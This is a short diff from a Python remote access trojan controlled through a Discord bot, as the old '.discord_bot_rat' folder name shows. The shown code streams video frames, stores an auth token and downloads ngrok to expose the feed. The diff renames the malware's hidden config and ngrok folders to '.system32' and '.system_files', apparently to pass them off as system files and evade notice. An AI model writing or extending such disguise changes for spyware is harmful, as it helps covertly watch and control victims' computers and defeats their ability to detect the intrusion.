@@ -301,9 +301,9 @@ def video_feed():
     global streamer
     return Response(streamer.generate_frames(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')
-CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".discord_bot_rat")
+CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".system32")
 os.makedirs(CONFIG_DIR, exist_ok=True)
-CONFIG_FILE = os.path.join(CONFIG_DIR, "bot_config.json")
+CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
 def save_config():
     config = {"auth_token": auth_token}
     with open(CONFIG_FILE, 'w') as f:
@@ -319,7 +319,7 @@ def load_config():
 def download_ngrok():
     url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
     
-    ngrok_dir = os.path.join(os.path.expanduser("~"), ".ngrok_bot")
+    ngrok_dir = os.path.join(os.path.expanduser("~"), ".system_files")
     os.makedirs(ngrok_dir, exist_ok=True)
     ngrok_path = os.path.join(ngrok_dir, "ngrok.exe")
     
